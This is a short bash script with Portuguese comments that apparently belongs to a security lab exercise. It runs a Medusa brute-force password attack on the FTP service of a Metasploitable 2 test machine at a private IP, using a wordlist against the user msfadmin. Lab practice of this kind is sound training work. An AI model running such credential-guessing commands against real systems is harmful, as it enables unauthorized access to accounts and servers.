#!/bin/bash
# Script de Simulação de Ataque de Força Bruta em FTP
# Ferramenta: Medusa
# Alvo: Metasploitable 2 (IP Fictício: 192.168.56.101)

echo "[*] Iniciando ataque de força bruta no serviço FTP..."
echo "[*] Alvo: 192.168.56.101"
echo "[*] Usuário: msfadmin"
echo "[*] Wordlist: ../wordlists/common_passwords.txt"

# Comando Medusa
# -h: Host
# -u: Usuário específico
# -P: Wordlist de senhas
# -M: Módulo (ftp)
# -f: Parar após encontrar a senha (opcional, bom para testes)

medusa -h 192.168.56.101 -u msfadmin -P ../wordlists/common_passwords.txt -M ftp -f

echo "[*] Ataque finalizado."
